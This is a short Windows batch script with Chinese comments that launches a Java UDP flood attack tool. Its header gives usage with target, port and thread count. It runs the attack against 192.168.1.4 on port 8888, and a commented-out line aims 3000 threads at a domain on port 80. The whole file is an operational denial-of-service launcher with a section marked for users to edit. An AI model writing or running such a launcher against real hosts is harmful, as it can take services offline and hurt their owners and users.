::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::UDP洪泛攻击脚本
::需要Java Runtime Environment（JRE）
::Author:凤翔（fengxiang220@gmail.com）
::Date:2014/1/6
::Usage:java {package name}.UDPFloodAttack <target> <port> <the number of attack threads>
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

@cd ./bin
@ECHO 开始攻击

::以下为用户修改部分
::java UDPFloodAttack ddns.find1x.com 80 3000
@java com.find1x.jnetcatch.udpattack.UDPFloodAttack 192.168.1.4 8888 1